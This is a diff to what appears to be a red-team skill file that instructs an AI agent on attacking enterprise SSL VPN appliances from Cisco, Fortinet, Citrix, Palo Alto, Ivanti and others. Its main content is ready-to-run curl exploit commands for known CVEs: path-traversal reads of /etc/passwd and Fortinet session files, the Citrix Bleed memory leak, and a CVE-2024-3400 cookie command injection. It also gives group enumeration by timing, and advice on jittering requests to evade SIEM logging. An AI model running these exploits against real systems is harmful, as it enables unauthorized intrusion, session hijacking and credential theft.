@@ -1,8 +1,11 @@
 ---
 name: enterprise-vpn-attack
 description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
-sources: authorized-engagement, public-advisories, cisa-kev
-report_count: 1
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [vpn, enterprise, attack, redteam]
 ---
 
 ## When to use this skill
@@ -25,7 +28,7 @@ DO NOT use for:
 
 ### Cisco ASA / AnyConnect
 ```bash
-curl -skI 'https://target/+CSCOE+/logon.html' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/+CSCOE+/logon.html' | head -10
 # Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
 # Login page contains: "AnyConnect", "CSCOE", "logon.html"
 ```
@@ -33,14 +36,14 @@ ASA version: not banner-disclosed in modern builds; need to derive from JS file 
 
 ```bash
 # Path-based version hints (older builds leaked builds in URLs)
-curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
-curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
-curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
 ```
 
 ### Fortinet FortiGate / FortiOS
 ```bash
-curl -skI 'https://target/remote/login' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/remote/login' | head -10
 # Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
 # Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
 ```
@@ -48,47 +51,47 @@ Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 respo
 
 ### Citrix NetScaler / ADC / Gateway
 ```bash
-curl -skI 'https://target/' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/' | head -10
 # Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
 # Login page contains: "NetScaler", "Citrix Gateway"
 
 # Version banner
-curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
-curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
 ```
 
 ### Palo Alto GlobalProtect
 ```bash
-curl -skI 'https://target/global-protect/login.esp' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/global-protect/login.esp' | head -10
 # Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
 # Page contains: "GlobalProtect Portal", "PAN-OS"
 
 # Version banner via login page
-curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
 # Or check meta tag
-curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
 ```
 
 ### Pulse Secure / Ivanti Connect Secure
 ```bash
-curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
 # Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
 # Page contains: "Pulse Secure" or "Ivanti Connect Secure"
 
 # Version
-curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
 ```
 
 ### SonicWall NetExtender / SMA
 ```bash
-curl -skI 'https://target/cgi-bin/welcome' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/cgi-bin/welcome' | head -10
 # Look for: Set-Cookie: swap=, swapauth=
 # Page contains: "SonicWall", "NetExtender", "SMA"
 ```
 
 ### F5 Big-IP / APM
 ```bash
-curl -skI 'https://target/my.policy' | head -10
+curl --max-time 30 --connect-timeout 10 -skI 'https://target/my.policy' | head -10
 # Look for: Set-Cookie: BIGipServer*, MRHSession=
 # Server: BIG-IP (sometimes)
 ```
@@ -108,10 +111,10 @@ curl -skI 'https://target/my.policy' | head -10
 
 ```bash
 # Cisco CVE-2020-3452 — file read
-curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5
 
 # Cisco CVE-2018-0296 — path traversal
-curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20
 
 # Files commonly retrievable on vulnerable ASA:
 # /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
@@ -131,7 +134,7 @@ curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE
 
 ```bash
 # Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
-curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
 # Response contains plaintext usernames + sessions if vulnerable
 
 # Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
@@ -150,12 +153,12 @@ curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../../////////
 ```bash
 # Citrix Bleed (CVE-2023-4966) detection
 HOST=$(python3 -c "print('A' * 24812)")
-curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
+curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
 # If response is large (>10KB) and contains random memory contents — vulnerable
 # Session tokens often present in the memory dump
 
 # CVE-2019-19781 file read
-curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
 ```
 
 ### Palo Alto GlobalProtect
@@ -166,7 +169,7 @@ curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
 
 ```bash
 # CVE-2024-3400 detection
-curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
+curl --max-time 30 --connect-timeout 10 -sk -X POST 'https://target/ssl-vpn/login.esp' \
   -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
   --data 'jsessionid=test'
 # Look for file-creation side-effect on test path — palo creates file with command output
@@ -183,7 +186,7 @@ curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
 
 ```bash
 # CVE-2019-11510 — Pulse file read
-curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
 ```
 
 ### SonicWall
@@ -201,13 +204,13 @@ Most enterprise VPNs now use SAML for SSO. Check SP metadata:
 
 ```bash
 # Cisco ASA
-curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50
 
 # Fortinet
-curl -sk 'https://target/remote/saml/metadata' | head -50
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/remote/saml/metadata' | head -50
 
 # Citrix
-curl -sk 'https://target/saml/login' | head -30
+curl --max-time 30 --connect-timeout 10 -sk 'https://target/saml/login' | head -30
 ```
 
 Look for:
@@ -244,7 +247,7 @@ Cisco ASA AAA groups can sometimes be enumerated without auth.
 ```bash
 # Tunnel group enumeration via timing
 for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
-  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
+  ms=$(curl -sk --max-time 10 --connect-timeout 10 -o /dev/null -w "%{time_total}" \
     -X POST "https://target/+webvpn+/index.html" \
     -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
   echo "$group: ${ms}s"
@@ -279,27 +282,27 @@ If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-s
 TARGET="vpn.target.com"
 
 # Cisco
-curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
-curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
-curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html
 
 # Fortinet
-curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/remote/login" 2>&1 | head -3
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt
 
 # Citrix
-curl -skI "https://$TARGET/" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/" 2>&1 | head -3
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
 HOST=$(python3 -c "print('A' * 24812)")
-curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
+curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
 wc -c /tmp/citrix_bleed.txt
 
 # Palo Alto
-curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3
 
 # Pulse / Ivanti
-curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
+curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
+curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
 ```
 
 ---
@@ -328,6 +331,46 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 
 ---
 
+## Verification
+
+Run this self-test to confirm VPN appliance fingerprinting works:
+
+1. **Cisco ASA fingerprint** — confirm path detection syntax:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/+CSCOE+/logon.html" -o /dev/null -w "HTTP %{http_code}
+" 2>/dev/null && echo "(test probe sent)"
+   ```
+
+2. **Fortinet path probe** — confirm FortiOS path syntax:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/remote/login" -o /dev/null -w "HTTP %{http_code}
+" 2>/dev/null && echo "(test probe sent)"
+   ```
+
+3. **CVE-2020-3452 probe syntax** — confirm Cisco file-read path construction:
+   ```bash
+   echo "https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua" | grep -q "+CSCOE+" && echo "PASS: CVE path syntax correct" || echo "FAIL"
+   ```
+
+4. **CVE-2018-13379 probe syntax** — confirm Fortinet path-traversal construction:
+   ```bash
+   echo "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" | grep -q "fgt_lang" && echo "PASS: Fortinet path syntax correct" || echo "FAIL"
+   ```
+
+5. **Citrix Bleed probe syntax** — confirm Host header overflow pattern:
+   ```bash
+   echo "POST /oauth/idp/.well-known/openid-configuration" | grep -q "openid-configuration" && echo "PASS: Citrix Bleed endpoint syntax correct" || echo "FAIL"
+   ```
+
+6. **SAML metadata probe** — confirm metadata endpoint syntax:
+   ```bash
+   echo "/+CSCOE+/saml/sp/metadata /remote/saml/metadata" | grep -q "saml" && echo "PASS: SAML metadata paths present" || echo "FAIL"
+   ```
+
+All 6 tests verify the VPN fingerprinting and CVE detection syntax.
+
+---
+
 ## Bridge to neighboring skills
 
 - `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
@@ -337,13 +380,21 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 
 ---
 
-## Anti-patterns
+## Pitfalls
 
 - **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
 - **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
-- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
+- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure; use `-rl 5` or lower
 - **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
 - **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
+- **Don't run pre-auth RCE PoCs without explicit authorization** — accidentally crashing a VPN concentrator is catastrophic. Detection-only tests first.
+- **Don't trust HTTP status codes alone** — patched appliances may return 200 on known-vulnerable paths but serve different content. Diff the response body against a baseline.
+- **Don't assume one vendor** — many enterprises run multiple VPN appliances (Cisco + Citrix, Fortinet + Pulse). Fingerprint all before selecting attack paths.
+- **Don't ignore the AAA backend** — knowing whether the VPN uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths completely.
+- **Lockout risk on default credentials** — most enterprise targets have changed factory passwords. Test ≤2 attempts per account.
+- **VPN appliances generate noisy logs** — every probe is likely logged to SIEM. Jitter timing between requests; don't rapid-fire.
+
+
 
 ---
 
